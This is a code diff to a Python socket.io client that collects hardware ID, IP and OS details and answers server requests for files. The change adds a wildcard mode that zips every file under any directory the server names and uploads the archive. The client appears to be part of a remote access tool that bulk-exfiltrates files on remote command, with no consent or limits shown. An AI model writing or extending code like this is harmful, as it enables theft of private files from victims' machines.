@@ -4,6 +4,8 @@ from utils.system_info import get_hwid, get_ip, get_os
 from config import SERVER_URL 
 import sys
 import os
+import zipfile
+import io
 
 sio = socketio.Client()
 UPLOAD_PATH = os.path.join(os.path.expanduser("~"), "Downloads")
@@ -64,20 +66,47 @@ def send_file(data):
         filepath = data['filePath']
         filename = data['filename']
 
+        print(f"Received request for file {filename} from {filepath}")
+
         if not filepath or not filename:
             print("Error: Missing required keys 'filePath' or 'filename'")
             sio.emit("fileResponse", {"status": False, "filename": filename})
             return
 
-        full_file_path = os.path.join(filepath, filename)
-        if os.path.exists(full_file_path):
-            with open(full_file_path, "rb") as f:
-                filebuffer = f.read()
-                sio.emit("fileResponse", {"status": True, "filename": filename, "fileBuffer": filebuffer})
-                print(f"File {filename} sent to server")
+        if filename == "*":
+            zip_buffer = io.BytesIO()
+
+            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for root, _, files in os.walk(filepath):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        arcname = os.path.relpath(file_path, filepath)
+                        zipf.write(file_path, arcname)
+
+            zip_buffer.seek(0)  # Zurück an den Anfang des Buffers
+
+            sio.emit("fileResponse", {
+                "status": True,
+                "filename": "all_files.zip",
+                "fileBuffer": zip_buffer.getvalue()
+            })
+            print(f"All files from {filepath} sent as ZIP")
+
         else:
-            print(f"Error: File {filename} not found in {filepath}")
-            sio.emit("fileResponse", {"status": False, "filename": filename})
+            full_file_path = os.path.join(filepath, filename)
+            if os.path.exists(full_file_path):
+                with open(full_file_path, "rb") as f:
+                    filebuffer = f.read()
+                    sio.emit("fileResponse", {
+                        "status": True,
+                        "filename": filename,
+                        "fileBuffer": filebuffer
+                    })
+                    print(f"File {filename} sent to server")
+            else:
+                print(f"Error: File {filename} not found in {filepath}")
+                sio.emit("fileResponse", {"status": False, "filename": filename})
+
     except Exception as e:
         print(f"An error occurred: {e}")
         sio.emit("fileResponse", {"status": False, "filename": filename})
